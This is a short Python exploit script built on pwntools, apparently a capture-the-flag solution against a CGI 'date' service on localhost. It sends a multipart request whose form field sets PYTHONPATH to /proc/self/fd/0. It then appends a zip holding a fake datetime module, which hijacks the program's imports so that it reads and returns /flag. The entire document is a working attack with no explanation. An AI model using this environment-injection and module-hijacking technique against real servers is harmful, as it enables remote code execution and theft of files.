#!/usr/bin/env python3

from pwn import *
from zipfile import ZipFile
import io

headers = """POST /cgi-bin/date HTTP/1.1\r
Host: localhost:1337\r
Accept: */*\r
Connection: close\r
Content-Type: multipart/form-data; boundary=------------------------417fd94d18a65140\r
Content-Length: {}\r
\r
"""

body = b"""--------------------------417fd94d18a65140
Content-Disposition: form-data; name="PYTHONPATH"\r
\r
/proc/self/fd/0\r
--------------------------417fd94d18a65140--\r
"""

def create_zip():
    buffer = io.BytesIO()
    with ZipFile(buffer, "a") as zip:
        zip.writestr("datetime/__init__.py", b"")
        zip.writestr("datetime/date.py", b"def today(): return open('/flag', 'r').read();")
    return buffer.getvalue()

def exploit():
    p = remote("localhost", 1337)
    post = body + create_zip()

    p.send(headers.format(len(post)).encode() + post)
    print(p.recvall().decode())

if __name__ == "__main__":
    exploit()